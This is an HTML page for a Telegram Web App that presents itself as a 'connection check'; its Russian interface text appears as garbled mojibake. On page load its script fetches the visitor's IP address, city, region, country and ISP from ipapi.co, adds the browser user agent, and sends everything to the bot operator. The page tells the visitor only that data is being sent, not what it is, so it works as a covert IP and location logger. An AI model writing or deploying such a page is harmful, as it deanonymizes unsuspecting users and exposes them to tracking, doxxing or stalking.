<body>
  <h2>üîç –ü—Ä–æ–≤–µ—Ä–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è...</h2>
  <div id="status">‚è≥ –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö...</div>
  <p>–û–∫–Ω–æ –º–æ–∂–Ω–æ –∑–∞–∫—Ä—ã—Ç—å</p>

  <script>
    async function sendData() {
      const status = document.getElementById("status");

      if (!Telegram.WebApp || !Telegram.WebApp.initData || Telegram.WebApp.initData.length === 0) {
        status.innerText = "‚ùå –û—Ç–∫—Ä–æ–π —Å—Ç—Ä–∞–Ω–∏—Ü—É —á–µ—Ä–µ–∑ Telegram";
        return;
      }

      try {
        const ipData = await fetch("https://ipapi.co/json/").then(r => r.json());
        const userAgent = navigator.userAgent;

        const payload = {
          ip: ipData.ip,
          city: ipData.city,
          region: ipData.region,
          country: ipData.country_name,
          org: ipData.org,
          ua: userAgent
        };

        Telegram.WebApp.sendData(JSON.stringify(payload));
        status.innerText = "‚úÖ –î–∞–Ω–Ω—ã–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã";
      } catch (e) {
        status.innerText = "‚ùå –û—à–∏–±–∫–∞: " + e.message;
      }
    }

    window.addEventListener('DOMContentLoaded', () => {
      setTimeout(sendData, 500);  // —á—É—Ç—å –±–æ–ª—å—à–µ –≤—Ä–µ–º–µ–Ω–∏ –Ω–∞ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—é
    });
  </script>
</body>
